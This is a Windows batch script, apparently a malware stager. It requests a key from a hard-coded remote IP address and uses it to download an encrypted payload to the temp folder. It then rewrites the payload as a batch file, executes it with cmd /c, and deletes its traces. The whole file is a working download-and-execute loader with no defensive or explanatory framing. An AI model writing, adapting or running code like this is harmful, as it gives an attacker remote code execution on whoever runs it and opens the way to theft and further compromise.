@echo off
setlocal enabledelayedexpansion

echo [INFO] ===== START =====

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat
set TMPFILE=%temp%\raw_payload.txt
set KEYFILE=%temp%\key.txt

REM ===== TS =====
echo [INFO] Generating timestamp...
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
echo [DEBUG] TS=%TS%

REM ===== KEY =====
echo [INFO] Requesting KEY...
curl -s "%BASE%/auth/key?ts=%TS%" > "%KEYFILE%"

if not exist "%KEYFILE%" (
    echo [ERROR] Key file not created
    exit /b 1
)

set /p KEY=<"%KEYFILE%"
echo [DEBUG] KEY=%KEY%

if "%KEY%"=="" (
    echo [ERROR] KEY is empty
    exit /b 1
)

REM ===== DOWNLOAD =====
echo [INFO] Downloading payload...
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%TMPFILE%"

if not exist "%TMPFILE%" (
    echo [ERROR] Payload file NOT found
    exit /b 1
)

for %%A in ("%TMPFILE%") do set SIZE=%%~zA
if %SIZE%==0 (
    echo [ERROR] Payload is empty (%SIZE% bytes)
    exit /b 1
)

REM ===== NORMALIZE (CRLF + ASCII) =====
echo [INFO] Normalizing payload (%SIZE% bytes)...
powershell -NoP -Command ^
    "$content = Get-Content '%TMPFILE%' -Raw -Encoding UTF8; ^
    $content -replace '[^\r\n]', {if ($_ -eq \"`n\" -and $prev -ne \"`r\") {\"`r`n\"} else {$_}} | ^
    Out-File -Encoding ASCII -NoNewline '%FILE%'"

REM ===== VALIDATE FINAL =====
for %%A in ("%FILE%") do set FINALSIZE=%%~zA
if %FINALSIZE%==0 (
    echo [ERROR] Normalized payload is empty
    exit /b 1
)

echo [INFO] Payload normalized (%FINALSIZE% bytes)
echo [DEBUG] Content preview:
type "%FILE%"

REM ===== EXECUTE =====
echo [INFO] Executing payload...
cmd /c "%FILE%" && echo [SUCCESS] Payload executed OK || echo [ERROR] Payload execution failed

echo [INFO] ===== END =====

REM Cleanup
del "%TMPFILE%" "%KEYFILE%" 2>nul
endlocal